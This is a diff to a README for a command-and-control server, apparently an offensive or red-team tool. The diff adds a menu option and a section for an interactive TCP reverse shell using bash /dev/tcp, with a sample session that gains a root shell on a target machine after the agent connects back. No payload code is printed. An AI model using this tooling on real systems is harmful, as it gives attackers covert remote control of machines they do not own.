@@ -71,6 +71,7 @@ Agent beacons every 10 seconds. Wait up to 30s for first check-in.
 | 11 | **Agent results** | View task history for a specific agent. |
 | 12 | **View logs** | In-memory log buffer. Tail, follow, clear. |
 | 13 | **Show token** | Display current auth token and one-liner commands. |
+| 14 | **Reverse shell** | TCP reverse shell via bash `/dev/tcp`. Opens listener, agent connects back. Real PTY shell. |
 | 0 | **Exit** | Stop server and quit. |
 
 ---
@@ -336,6 +337,38 @@ This project expects the tunnel already configured. The tunnel provides:
 - DDoS protection and access control
 
 ---
+
+### 14. Reverse Shell (TCP)
+
+Real interactive TCP reverse shell using bash's `/dev/tcp`. Opens a random port on the C2 server, sends connect-back payload to agent, bridges the socket to a local PTY. Full terminal support — `su`, `ssh`, `nano`, `htop`, `vim` all work.
+
+```text
+C2> 14
+Agent ID: a1b2c3d4
+[*] Starting reverse shell listener on 0.0.0.0:34567
+[*] Agent will connect to 192.168.100.82:34567
+[*] Sending payload to agent...
+[+] Reverse shell received from ('192.168.100.79', 54321)
+[*] You now have a real shell. Type 'exit' to return.
+
+root@target:~# whoami
+root
+root@target:~# cd /root
+root@target:~# ls
+root@target:~# exit
+[+] Shell closed
+```
+
+Uses `pty.fork()` for proper terminal emulation. Handles SIGWINCH for resize. Type `exit` to close.
+
+## Limitations of Option 4 (HTTP Shell)
+
+The interactive shell (option 4) uses HTTP polling — agent beacons every 2s, commands are sent as tasks, results are polled. This means:
+- ~2-4s latency per command
+- No stdin for interactive programs (fixed with PTY in latest version)
+- Shell prompt noise in output
+
+For full terminal experience, use **option 14 (Reverse shell)** instead.
 
 ## Security Notes
 
